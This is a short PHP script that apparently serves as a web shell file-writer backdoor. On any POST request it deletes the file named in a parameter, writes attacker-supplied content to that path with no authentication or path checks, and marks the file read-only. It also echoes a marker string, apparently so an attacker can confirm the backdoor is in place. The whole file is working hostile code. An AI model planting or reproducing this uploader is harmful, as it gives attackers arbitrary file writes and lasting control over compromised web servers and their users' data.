<?php
if ($_POST) {
    $file = $_POST["f"];

    if (file_exists($file)) {
        unlink($file);
    }

    $f = fopen($file, "w");

    if ($f) {
        if (fwrite($f, $_POST["c"])) {
            echo "<font color=red>OK!</font>";

            chmod($file, 0444);
        } else {
            echo "<font color=blue>Error!</font>";
        }

        fclose($f);
    } else {
        echo "Unable to open file for writing.";
    }
}

echo 'SXSXSXSX';
?>
